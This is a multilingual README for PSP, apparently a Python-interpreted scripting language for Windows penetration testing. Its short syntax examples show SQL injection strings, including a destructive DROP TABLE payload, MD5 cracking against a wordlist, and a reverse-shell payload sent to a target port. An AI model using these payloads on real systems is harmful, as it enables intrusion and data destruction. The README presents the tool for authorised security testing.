# PSP (PowerShellPlus) - 화이트해커를 위한 Windows 보안 테스팅 언어

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
[![Platform: Windows](https://img.shields.io/badge/platform-Windows-lightgrey.svg)](https://www.microsoft.com/windows)

## 🔥 개요 (한국어)

PSP (PowerShellPlus)는 윈도우 환경에서 화이트해커와 보안 전문가들이 모의해킹 및 보안 테스팅을 효율적으로 수행할 수 있도록 설계된 전문 프로그래밍 언어입니다. 

Python의 pwntools, winpwn 라이브러리의 모든 기능을 내장하고 있으며, C언어, PowerShell, Python의 문법적 장점을 결합하여 직관적이고 강력한 보안 테스팅 도구를 제공합니다.

### 🎯 주요 특징

- **Windows 특화**: 윈도우 시스템에 최적화된 보안 테스팅 기능
- **내장 해킹 도구**: pwntools, winpwn의 모든 기능을 기본 제공
- **간결한 문법**: C언어 + PowerShell + Python의 하이브리드 문법
- **즉시 실행**: 컴파일 없이 바로 실행 가능한 인터프리터 언어
- **확장 가능**: 모듈 시스템으로 기능 확장 가능

### 🚀 설치 및 실행

```bash
# PSP 인터프리터 실행
python src/psp_interpreter.py example.pspp

# 대화형 모드
python src/psp_interpreter.py -i

# 도움말
python src/psp_interpreter.py --help
```

### 📝 기본 문법 예제

```psp
# 네트워크 스캔
string target = "192.168.1.100"
int[] open_ports = port_scan(target, [80, 443, 22, 21])
printf("열린 포트: %s\n", array_to_string(open_ports))

# SQL 인젝션 테스트
string[] sqli_payloads = ["' OR 1=1 --", "'; DROP TABLE users; --"]
foreach (payload in sqli_payloads) {
    test_sql_injection("http://target.com/login.php", "username", payload)
}

# 해시 크래킹
string hash = "5d41402abc4b2a76b9719d911017c592"
string plaintext = crack_hash_md5(hash, "rockyou.txt")
printf("크래킹 결과: %s\n", plaintext)

# 시스템 정보 수집
dict<string, string> sys_info = get_system_info()
printf("OS: %s, 사용자: %s\n", sys_info["os"], sys_info["user"])
password_hash = sha256("admin123")
print("SHA256:", password_hash)
```

### 🛠️ 내장 함수 카테고리

#### 네트워크 & 스캔
- `scan_port()`, `scan_range()`, `connect()`, `send()`, `recv()`

#### 암호화 & 해시
- `md5()`, `sha1()`, `sha256()`, `base64_encode()`, `base64_decode()`

#### 익스플로잇 & 페이로드
- `create_payload()`, `buffer_overflow()`, `shellcode()`

#### 윈도우 시스템
- `enum_processes()`, `enum_services()`, `registry_read()`, `registry_write()`

#### 파일 시스템
- `file_read()`, `file_write()`, `file_exists()`, `dir_list()`

### 📚 예제 파일

PSP 언어의 모든 기능을 학습할 수 있는 체계적인 예제들을 제공합니다:

#### 🎓 초급 예제
- `examples/hello_world.pspp` - 기본 문법과 출력
- `examples/index.pspp` - 예제 가이드 및 학습 순서

#### 🛠️ 중급 예제  
- `examples/network_scan.pspp` - 네트워크 스캔 및 포트 탐지
- `examples/system_recon.pspp` - 시스템 정보 수집 및 정찰
- `examples/vulnerability_test.pspp` - 웹 취약점 테스트
- `examples/web_application_test.pspp` - 웹 애플리케이션 보안 테스트

#### 🎯 고급 예제
- `examples/advanced_features.pspp` - 고급 언어 기능 및 최적화
- `examples/comprehensive_features.pspp` - **모든 언어 기능 종합 데모**
- `examples/security_toolkit.pspp` - **완전한 보안 도구 모음**
- `examples/practical_projects.pspp` - **실무용 프로젝트 예제**

#### 📖 학습 가이드
각 예제는 독립적으로 실행 가능하며, 다음 순서로 학습하는 것을 권장합니다:

1. **hello_world.pspp** → 기본 문법 익히기
2. **comprehensive_features.pspp** → 전체 언어 기능 파악  
3. **network_scan.pspp** → 네트워크 보안 기초
4. **security_toolkit.pspp** → 고급 보안 도구 활용
5. **practical_projects.pspp** → 실무 프로젝트 적용

```bash
# 예제 실행 방법
python3 src/psp_interpreter.py examples/comprehensive_features.pspp
python3 src/psp_interpreter.py examples/security_toolkit.pspp
```

### 📖 문서

- [문법 가이드](docs/syntax.md) - PSP 언어 문법 상세 설명
- [API 레퍼런스](docs/api_reference.md) - 모든 내장 함수 설명
- [튜토리얼](docs/tutorial.md) - 단계별 학습 가이드

---

## 🔥 Overview (English)

PSP (PowerShellPlus) is a specialized programming language designed for white hat hackers and security professionals to efficiently perform penetration testing and security assessments in Windows environments.

It incorporates all features from Python's pwntools and winpwn libraries as built-in functions, combining the syntactic advantages of C, PowerShell, and Python to provide an intuitive and powerful security testing tool.

### 🎯 Key Features

- **Windows Optimized**: Security testing features optimized for Windows systems
- **Built-in Hacking Tools**: All pwntools and winpwn features included by default
- **Concise Syntax**: Hybrid syntax combining C + PowerShell + Python
- **Immediate Execution**: Interpreted language that runs without compilation
- **Extensible**: Module system for feature extension

### 🚀 Installation & Usage

```bash
# Run PSP interpreter
python src/psp_interpreter.py example.pspp

# Interactive mode
python src/psp_interpreter.py -i

# Help
python src/psp_interpreter.py --help
```

### 📝 Basic Syntax Examples

```psp
# Network scanning
target = "192.168.1.100"
open_ports = scan_range(target, 1, 1000)
print("Open ports:", open_ports)

# Payload generation
payload = create_payload("reverse_shell", "192.168.1.50")
send(target, 4444, payload)

# System information gathering
processes = enum_processes()
printf("Running processes: %d", len(processes))

# Hash calculation
password_hash = sha256("admin123")
print("SHA256:", password_hash)
```

### 🛠️ Built-in Function Categories

#### Network & Scanning
- `scan_port()`, `scan_range()`, `connect()`, `send()`, `recv()`

#### Cryptography & Hashing
- `md5()`, `sha1()`, `sha256()`, `base64_encode()`, `base64_decode()`

#### Exploit & Payload
- `create_payload()`, `buffer_overflow()`, `shellcode()`

#### Windows System
- `enum_processes()`, `enum_services()`, `registry_read()`, `registry_write()`

#### File System
- `file_read()`, `file_write()`, `file_exists()`, `dir_list()`

---

## 🔥 概要 (日本語)

PSP (PowerShellPlus)は、Windows環境でホワイトハッカーやセキュリティ専門家が効率的にペネトレーションテストやセキュリティ評価を実行できるように設計された専門プログラミング言語です。

Pythonのpwntoolsやwinpwnライブラリのすべての機能を内蔵し、C言語、PowerShell、Pythonの構文的利点を組み合わせて、直感的で強力なセキュリティテストツールを提供します。

### 🎯 主な特徴

- **Windows最適化**: Windowsシステムに最適化されたセキュリティテスト機能
- **内蔵ハッキングツール**: pwntoolsとwinpwnのすべての機能をデフォルトで提供
- **簡潔な構文**: C言語 + PowerShell + Pythonのハイブリッド構文
- **即座実行**: コンパイル不要で直接実行可能なインタープリター言語
- **拡張可能**: モジュールシステムによる機能拡張が可能

### 🚀 インストールと使用法

```bash
# PSPインタープリター実行
python src/psp_interpreter.py example.pspp

# インタラクティブモード
python src/psp_interpreter.py -i

# ヘルプ
python src/psp_interpreter.py --help
```

---

## 🔥 概述 (中文)

PSP (PowerShellPlus) 是一种专门为白帽黑客和安全专业人员设计的编程语言，用于在Windows环境中高效执行渗透测试和安全评估。

它内置了Python的pwntools和winpwn库的所有功能，结合了C语言、PowerShell和Python的语法优势，提供直观而强大的安全测试工具。

### 🎯 主要特性

- **Windows优化**: 针对Windows系统优化的安全测试功能
- **内置黑客工具**: 默认提供pwntools和winpwn的所有功能
- **简洁语法**: C语言 + PowerShell + Python的混合语法
- **即时执行**: 无需编译即可直接运行的解释型语言
- **可扩展**: 通过模块系统进行功能扩展

### 🚀 安装和使用

```bash
# 运行PSP解释器
python src/psp_interpreter.py example.pspp

# 交互模式
python src/psp_interpreter.py -i

# 帮助
python src/psp_interpreter.py --help
```

---

## 🤝 기여하기 (Contributing)

PSP 언어 개발에 참여하고 싶으시다면:

1. 이 저장소를 포크하세요
2. 새로운 기능 브랜치를 만드세요 (`git checkout -b feature/AmazingFeature`)
3. 변경사항을 커밋하세요 (`git commit -m 'Add some AmazingFeature'`)
4. 브랜치에 푸시하세요 (`git push origin feature/AmazingFeature`)
5. Pull Request를 여세요

## 📄 라이선스 (License)

이 프로젝트는 MIT 라이선스 하에 배포됩니다. 자세한 내용은 [LICENSE](LICENSE) 파일을 참조하세요.

## ⚠️ 면책조항 (Disclaimer)

PSP는 교육 목적과 승인된 보안 테스팅을 위해서만 사용되어야 합니다. 무단으로 타인의 시스템에 침입하거나 악의적인 목적으로 사용하는 것은 법적 처벌을 받을 수 있습니다. 사용자는 해당 지역의 법률을 준수할 책임이 있습니다.

## 🙏 감사의 말 (Acknowledgments)

- Python pwntools 팀
- PowerShell 개발팀
- 보안 커뮤니티의 모든 기여자들

---

**PSP - 윈도우를 위한 해커의 프로그래밍 언어** 🔐
